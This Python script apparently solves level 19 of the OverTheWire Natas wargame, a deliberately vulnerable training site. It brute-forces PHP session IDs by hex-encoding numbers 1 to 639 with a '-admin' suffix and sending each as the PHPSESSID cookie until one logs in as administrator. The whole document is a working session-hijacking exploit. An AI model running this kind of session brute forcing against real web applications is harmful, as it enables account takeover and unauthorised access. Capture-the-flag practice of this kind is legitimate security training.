import requests

a_pass = "natas_19_password"
a_user = "natas19"
maxid = 640
def num2hex(i):
    if i >= 10 :
        return num2hex(int(i/10))+num2hex(int(i%10))
    return hex(ord(str(i)))[2:]

for i in range(1,maxid):
    print(f'trying {num2hex(i)+"2d61646d696e"} ...')
    url = f"http://natas19.natas.labs.overthewire.org/index.php"
    r = requests.post(url,auth=(a_user,a_pass),cookies={"PHPSESSID": num2hex(i)+"2d61646d696e"})
    if "You are logged in as a regular user. " not in r.text:
        print(r.text)
        break



